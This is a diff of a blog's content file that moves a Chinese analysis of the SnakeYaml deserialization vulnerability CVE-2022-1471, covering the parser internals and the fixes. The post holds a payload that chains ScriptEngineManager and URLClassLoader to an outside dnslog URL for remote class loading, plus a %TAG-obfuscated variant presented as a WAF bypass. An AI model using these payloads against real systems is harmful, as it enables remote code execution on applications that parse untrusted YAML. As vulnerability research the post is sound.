-    <content><![CDATA[<h1 id="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"><a href="#SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）" class="headerlink" title="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"></a>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</h1><blockquote>
-<p>文字描述难免有所补足，请移步视频讲解：<a href="https://www.bilibili.com/video/BV1X14y1v71x/">SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</a></p>
-</blockquote>
-<h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>，支持所有YAML定义的类型。</p>
-<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>该漏洞源于程序在进行反序列化过程中未对用户输入内容做合法性验证，导致了恶意代码执行。</p>
-<span id="more"></span>
+    <title>LDAP-轻量级目录访问协议</title>
+    <url>/2025/04/10/LDAP-%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<div class="pdfobject-container" data-target="https://dayutech.github.io/pdf/LDAP-轻量级目录访问协议.pdf" data-height="500px"></div>
 
-<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt;&#x3D; SnakeYaml 1.33</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入snakeyaml包</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>编写测试类</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.constructor.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://i0hrz1.dnslog.cn\&quot;]]]]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在dnslog平台获取一个域名填到payload中，然后运行程序观察dnslog平台得域名解析情况，若有解析记录，则证明存在漏洞。</p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>本文我们不从漏洞手，而是首先了解以下snakeyaml时怎样进行反序列化的，观察在反序列化过程中都有哪些重要的步骤，反序列化过程中又是为何能够解析到我们提供的域名，进而能够进行远程类加载，执行恶意代码。首先我们需要打初始的断点：</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814161735123.png" alt="image-20230814161735123"></p>
-<p>虽然漏洞的触发入口时在load方法，但是我们首先需要关注的时yaml对象的初始化过程。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814161845728.png" alt="image-20230814161845728"></p>
-<p>从上图，yaml队形初始化过程中共计涉及到5个对象的构建</p>
-<table>
-<thead>
-<tr>
-<th>对象</th>
-<th>功用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Contructor</td>
-<td>对象构造器，负责JavaBean对象的构造</td>
-</tr>
-<tr>
-<td>Representer</td>
-<td>表示器，不知道有啥用，因为没有具体到它的方法，它在本漏洞中扮演的角色不是特别重要</td>
-</tr>
-<tr>
-<td>DumperOptions</td>
-<td>JavaBean对象序列化选项</td>
-</tr>
-<tr>
-<td>LoaderOptions</td>
-<td>yaml序列化数据反序列化配置选项，在漏洞修复版本中就是在该类中增加了新的反序列化选项来限制自定义的全局TAG</td>
-</tr>
-<tr>
-<td>Resolver</td>
-<td>分析器，具体作用定位不太好描述，另外还有个parser，和resolver解释很像，没太区分明白，当然仔细研究的话肯定还是可以区分。</td>
-</tr>
-</tbody></table>
-<p>load方法会调用loadFromReader从streamReader中加载对象，而streamReader其实又封装了stringReader对象，面向对象这层层封装还是挺恶心的。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814162654884.png" alt="image-20230814162654884"></p>
-<p>可以看到就是封装了一些元数据，包括数据窗口的大小，数据长度，数据流，流是否结束标志，缓冲区等，而在StringReader中也仅封装了字符串长度与字符串字面量而已。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814162937919.png" alt="image-20230814162937919"></p>
-<p>loadFromReader方法主要完成composer（构建器）的创建以及数据的构建。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814163122111.png" alt="image-20230814163122111"></p>
-<p>构建器里主要封装了解析器、分析器、反序列化配置、锚点、递归节点等数据。</p>
-<p>解析器里封装了扫描器，扫描器负责对序列化字符串进行逐个字符扫描以获取token、元素入口与出口、获取键与值、块入口与出口等。</p>
-<p>分析器主要负责通过数据内容来推测对应的数据类型，Yaml语法中主要包含三种数据类型即序列、映射与标量，所谓序列就是列表、数组类似的概念，映射可以理解为Python中的字典、Java中的Map，标量时Yaml中的最小的不可再分的基本数据类型，包括字符串、整数、浮点数、日期时间等类型。</p>
-<p>通过contrutor的getSingleData方法可以获得到一个type指定类型的对象。其首先需要调用composer的getSingleNode方法获取到一个Node对象，该Node对象时对我们传入的序列化数据的格式化解析与封装。然后电泳constructDocument方法通过Node对象获取最终的目标对象。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164251442.png" alt="image-20230814164251442"></p>
-<p>我们首先关注getSingleNode方法。进入该方法会首先通过解析器对事件进行配置</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164458986.png" alt="image-20230814164458986"></p>
-<p>可以看到获取事件时其实时同故宫state对象进行创建的，而state对象其实是一个Production接口的实例。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164703271.png" alt="image-20230814164703271"></p>
-<p>其有很多的实现类，分别对应不同的节点类型的不同处理阶段。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164959202.png" alt="image-20230814164959202"></p>
-<p>我们在初始化解析器的时候会初始化state对下个为ParseStreamStart的实例</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814165131638.png" alt="image-20230814165131638"></p>
-<p>故此处调用的produce方法即是<code>org.yaml.snakeyaml.parser.ParserImpl.ParseStreamStart#produce</code>，在该方法中获取了获取了流解析开始事件并重置了state为下一阶段的隐式文档解析开始状态。每一个事件中都包含两个重要的标志Mark，一个称之为startMark一个称之为endMark，分别标识了当前事件处理的开始与结束位置</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814165258362.png" alt="image-20230814165258362"></p>
-<p>在获取到事件后，判断事件是否为流结束事件，若不是则进入到节点解析逻辑。在此逻辑开始时会调用getEvent方法获取一个开始事件，待composeNode方法调用完毕后，再嗲用getEvent方法获取到一个结束事件，最后对锚点与记录的递归节点进行清理。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170038625.png" alt="image-20230814170038625"></p>
-<p>在composeNode方法中主要有两个分支，如果你的序列化数据设置了锚点与别名此时会进入第一个分支，若没有则会进入到else分支，我们这里会进入到else分支。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170426979.png" alt="image-20230814170426979"></p>
-<p>在else分支中还是首先会把事件往前推一次，获得的NodeEvent主要包含三种类型分别为ScalarNode SequenceNode MappingNode，即我们开始谈到的Yaml格式的三种类型标量、序列以及映射，很明显我们这里会进入到序列的处理逻辑里面。</p>
-<p>在composeSequenceNode方法中首先设置事件为SequenceStartEvent，即序列处理开始，然后会尝试获取Tag，关于tag的内容可以在<a href="https://yaml.org/spec/1.2.2/#tag-shorthands%E4%BA%86%E8%A7%A3%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASequenceNode%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%9C%A8%E6%9E%84%E9%80%A0SequenceNode%E5%AF%B9%E8%B1%A1%E6%97%B6%E4%BC%9A%E5%B0%86children%E5%BD%93%E4%BD%9C%E5%8F%82%E6%95%B0%E4%BC%A0%E8%BF%9B%E5%8E%BB%E8%B5%8B%E5%80%BC%E7%BB%99%E5%B1%9E%E6%80%A7this.value%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93ArrayList%E6%98%AF%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%8B%A5%E4%BB%A5%E5%A4%96%E7%A7%92%E5%AF%B9children%E7%9A%84%E4%BF%AE%E6%94%B9%E5%B0%86%E5%BD%B1%E5%93%8D%E5%88%B0SequenceNode%E4%B8%AD%E7%9A%84%E5%80%BC%E3%80%82%E7%84%B6%E5%90%8E%E5%97%B2%E7%94%A8composeNode%E6%96%B9%E6%B3%95%E7%BB%A7%E7%BB%AD%E8%BF%9B%E8%A1%8C%E8%8A%82%E7%82%B9%E5%90%8E%E8%A7%81%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%88%B0children%E4%B8%AD%E4%BD%9C%E4%B8%BASequenceNode%E7%9A%84%E5%AD%90%E8%8A%82%E7%82%B9%E3%80%82%E5%88%B0%E8%BF%99%E9%87%8C%E5%B0%B1%E5%B7%B2%E7%BB%8F%E5%BC%80%E5%A7%8B%E9%80%92%E5%BD%92%E8%A7%A3%E6%9E%90%E4%BA%86%EF%BC%8C%E7%9B%B4%E5%88%B0%E8%A7%A3%E6%9E%90%E5%88%B0StreamEnd%E3%80%82">https://yaml.org/spec/1.2.2/#tag-shorthands了解，然后创建一个SequenceNode对象，在构造SequenceNode对象时会将children当作参数传进去赋值给属性this.value，我们知道ArrayList是引用类型，若以外秒对children的修改将影响到SequenceNode中的值。然后嗲用composeNode方法继续进行节点后见并添加到children中作为SequenceNode的子节点。到这里就已经开始递归解析了，直到解析到StreamEnd。</a></p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170947063.png" alt="image-20230814170947063"></p>
-<p>在获取到Node后，就进入到目标对象构建的流程中</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814172249327.png" alt="image-20230814172249327"></p>
-<p>在constructObject方法中还对获取到的node对象进行了缓存检查</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814172306770.png" alt="image-20230814172306770"></p>
-<p>在调用getConstructor时会首先从预设好的13中内置构造器中尝试选择，若没有匹配的则返回一个ConstructYamlObject的构造器，然后调用器ConstructYamlObject的getConstructor方法通过反射的方式获得目标类的Class实例，然后根据Node类型获取到不同的几点构造器，此处为ContructSequence</p>
-<p>然后调用器construct方法，该方法也时通过节点tag的不同类型选择不同的处理逻辑，这里会进入到可变对象的对象构建逻辑中。由下图，在这个逻辑中会首先获取当前Node的value属性，也就是子节点的尺寸然后与获得的目标类的构造方法的参数尺寸进行比较，若成功匹配则依次对直接点调用constructObjec递归构建对象然后作为父节点的构造方法参数传参同通过反射的方式进行实例化。</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814173636570.png" alt="image-20230814173636570"></p>
-<p>在我们提供的payload中，也就是最终我们要构建的类是javax.script.ScriptEngineManager，构造该类调用的是其含有一个参数的有参构造方法，其参数为一个类加载器java.net.URLClassLoader，而在构造java.net.URLClassLoader时也是调用其含有一个参数的有参构造方法不过其参数时一个数组，所以我们会考到java.net.URLClassLoader后嵌套了两层[[，其数组类型为java.net.URL。我们知道URLClassLoader会从传入的URL进行远程的类加载工作，那么这个payload极有可能涉及到远程恶意类加载与实例化。那么ScriptEngineManager的构造方法又做了什么呢</p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174418936.png" alt="image-20230814174418936"></p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174500741.png" alt="image-20230814174500741"></p>
-<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174437825.png" alt="image-20230814174437825"></p>
-<p>可以看到这是一个很明显的SPI调用过程，我们只需要在远程部署一个实现了ScriptEngineFactory接口的类，并子啊其静态代码块中写入命令执行的代码，并在其Classpath:META-INFO&#x2F;services&#x2F;javax.script.ScriptEngineFactory文件中应用该实现类即可完成利用。具体的远程RCE可以上网自行寻找。</p>
-<p>在最新版的snake中该漏洞得到了修复，官方通过在loadConfigs对象中引入了新的配置项并且限制了反序列化递归调用嵌套深度的方式来对反序列化漏洞进行了限制。</p>
-<p>限制递归深度在org.yaml.snakeyaml.composer.Composer#increaseNestingDepth方法中检查，最大深度默认为50层</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814193403071.png" alt="image-20230814193403071"></p>
-<p>目标类类型检查在下图处检查，首先节点Tag是否是自定义的全局tag如果是则调用org.yaml.snakeyaml.inspector.TagInspector#isGlobalTagAllowed方法进行检查，TagInspector是一个接口，其默认实现是org.yaml.snakeyaml.inspector.UnTrustedTagInspector。isGlobalTagAllowed方法默认返回false，即不允许使用全局的Tag。</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814193503552.png" alt="image-20230814193503552"></p>
-<p>我们在编写代码的时候如果需要指定发序列化的目标类类型则必须要实现TagInspector接口，重写isGlobalTagAllowed方法，然后将其注入到LoaderOptions实例化对象中。</p>
-<p>默认不允许使用全局tag</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194127911.png" alt="image-20230814194127911"></p>
-<p>实现TagInspector接口，此处直接返回true，也可以在isGlobalTagAllowed方法中根据tag来进行逻辑判断决定允许哪些类能被反序列化。</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194330452.png" alt="image-20230814194330452"></p>
-<p>重写isGlobalTagAllowed方法后的结果</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194609615.png" alt="image-20230814194609615"></p>
-<p>远程类加载</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194851114.png" alt="image-20230814194851114"></p>
-<p>在分析的过程中我发现了一些好玩的地方，手下时除了load方法可以利用该payload外，如果我们使用的时loadAs方法被人制定了目标类的类型应该怎么办？</p>
-<p>当然如果类型不匹配，即ScriptEngineFactory如果不是目标类的子类或这实现类，就没得玩，但是如果是一些抽象级别比较高的类还是大有可为的，比如xxxx组件就是这么干的，嗯一个CVE到手了。</p>
-<p>两外我们可以利用Yaml语法中的TAG特性来实现WAF绕过，我们只需要对payload进行以下的变形</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">%TAG</span> <span class="type">!m</span><span class="string">!</span> <span class="string">tag:yaml.org,2002:java</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="type">!m!x.script.ScriptEngineManager</span> [<span class="type">!m!.net.URLClassLoader</span> [[<span class="type">!m!.net.URL</span> [<span class="string">&quot;http://i0hrz1.dnslog.cn&quot;</span>]]]]</span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
-
-<p>依旧RCE，还可以用来绕WAF</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814195046711.png" alt="image-20230814195046711"></p>
-<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
-<li>升级软件到不受影响的版本或最新版，最新版maven仓库地址：<a href="https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1%E3%80%82">https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1。</a></li>
-<li>限制服务器出网</li>
-</ol>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471</a></li>
-<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2022-1471">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2022-1471</a></li>
-<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471</a></li>
-<li><a href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></li>
-<li><a href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/">https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/</a></li>
-<li><a href="https://www.cnblogs.com/R0ser1/p/16213257.html">https://www.cnblogs.com/R0ser1/p/16213257.html</a></li>
-</ul>
 ]]></content>
       <categories>
+        <category>漏洞原理</category>
         <category>安全技术</category>
-        <category>漏洞分析</category>
       </categories>
       <tags>
-        <tag>RCE</tag>
-        <tag>反序列化</tag>
         <tag>网络安全</tag>
-        <tag>漏洞分析</tag>
-        <tag>漏洞</tag>
-        <tag>SnakeYaml</tag>
-        <tag>CVE-2022-1471</tag>
+        <tag>ldap</tag>
+        <tag>漏洞原理</tag>
       </tags>
   </entry>
   <entry>
@@ -692,6 +483,312 @@
       </tags>
   </entry>
   <entry>
+    <title>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</title>
+    <url>/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/</url>
+    <content><![CDATA[<h1 id="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"><a href="#SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）" class="headerlink" title="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"></a>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</h1><blockquote>
+<p>文字描述难免有所补足，请移步视频讲解：<a href="https://www.bilibili.com/video/BV1X14y1v71x/">SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</a></p>
+</blockquote>
+<h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>，支持所有YAML定义的类型。</p>
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>该漏洞源于程序在进行反序列化过程中未对用户输入内容做合法性验证，导致了恶意代码执行。</p>
+<span id="more"></span>
+
+<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt;&#x3D; SnakeYaml 1.33</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入snakeyaml包</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>编写测试类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.constructor.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://i0hrz1.dnslog.cn\&quot;]]]]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在dnslog平台获取一个域名填到payload中，然后运行程序观察dnslog平台得域名解析情况，若有解析记录，则证明存在漏洞。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>本文我们不从漏洞手，而是首先了解以下snakeyaml时怎样进行反序列化的，观察在反序列化过程中都有哪些重要的步骤，反序列化过程中又是为何能够解析到我们提供的域名，进而能够进行远程类加载，执行恶意代码。首先我们需要打初始的断点：</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814161735123.png" alt="image-20230814161735123"></p>
+<p>虽然漏洞的触发入口时在load方法，但是我们首先需要关注的时yaml对象的初始化过程。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814161845728.png" alt="image-20230814161845728"></p>
+<p>从上图，yaml队形初始化过程中共计涉及到5个对象的构建</p>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>功用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Contructor</td>
+<td>对象构造器，负责JavaBean对象的构造</td>
+</tr>
+<tr>
+<td>Representer</td>
+<td>表示器，不知道有啥用，因为没有具体到它的方法，它在本漏洞中扮演的角色不是特别重要</td>
+</tr>
+<tr>
+<td>DumperOptions</td>
+<td>JavaBean对象序列化选项</td>
+</tr>
+<tr>
+<td>LoaderOptions</td>
+<td>yaml序列化数据反序列化配置选项，在漏洞修复版本中就是在该类中增加了新的反序列化选项来限制自定义的全局TAG</td>
+</tr>
+<tr>
+<td>Resolver</td>
+<td>分析器，具体作用定位不太好描述，另外还有个parser，和resolver解释很像，没太区分明白，当然仔细研究的话肯定还是可以区分。</td>
+</tr>
+</tbody></table>
+<p>load方法会调用loadFromReader从streamReader中加载对象，而streamReader其实又封装了stringReader对象，面向对象这层层封装还是挺恶心的。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814162654884.png" alt="image-20230814162654884"></p>
+<p>可以看到就是封装了一些元数据，包括数据窗口的大小，数据长度，数据流，流是否结束标志，缓冲区等，而在StringReader中也仅封装了字符串长度与字符串字面量而已。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814162937919.png" alt="image-20230814162937919"></p>
+<p>loadFromReader方法主要完成composer（构建器）的创建以及数据的构建。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814163122111.png" alt="image-20230814163122111"></p>
+<p>构建器里主要封装了解析器、分析器、反序列化配置、锚点、递归节点等数据。</p>
+<p>解析器里封装了扫描器，扫描器负责对序列化字符串进行逐个字符扫描以获取token、元素入口与出口、获取键与值、块入口与出口等。</p>
+<p>分析器主要负责通过数据内容来推测对应的数据类型，Yaml语法中主要包含三种数据类型即序列、映射与标量，所谓序列就是列表、数组类似的概念，映射可以理解为Python中的字典、Java中的Map，标量时Yaml中的最小的不可再分的基本数据类型，包括字符串、整数、浮点数、日期时间等类型。</p>
+<p>通过contrutor的getSingleData方法可以获得到一个type指定类型的对象。其首先需要调用composer的getSingleNode方法获取到一个Node对象，该Node对象时对我们传入的序列化数据的格式化解析与封装。然后电泳constructDocument方法通过Node对象获取最终的目标对象。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164251442.png" alt="image-20230814164251442"></p>
